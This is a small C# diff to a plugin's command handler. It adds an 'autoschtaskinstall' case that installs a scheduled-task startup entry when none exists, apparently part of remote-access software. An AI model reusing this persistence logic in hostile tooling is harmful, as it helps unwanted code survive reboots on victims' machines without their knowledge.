@@ -56,8 +56,19 @@ namespace Plugin
 
                     case "schtaskinstall":
                         {
+                            //HandleSchtaskInstall.DelStartUp();
                             HandleSchtaskInstall.AddStartUp();
                             //Connection.Disconnected();
+                            break;
+                        }
+
+                    case "autoschtaskinstall":
+                        {
+                            if (!HandleSchtaskInstall.GetStartUp()) 
+                            {
+                                HandleSchtaskInstall.AddStartUp();
+                                //Connection.Disconnected();
+                            }
                             break;
                         }
 
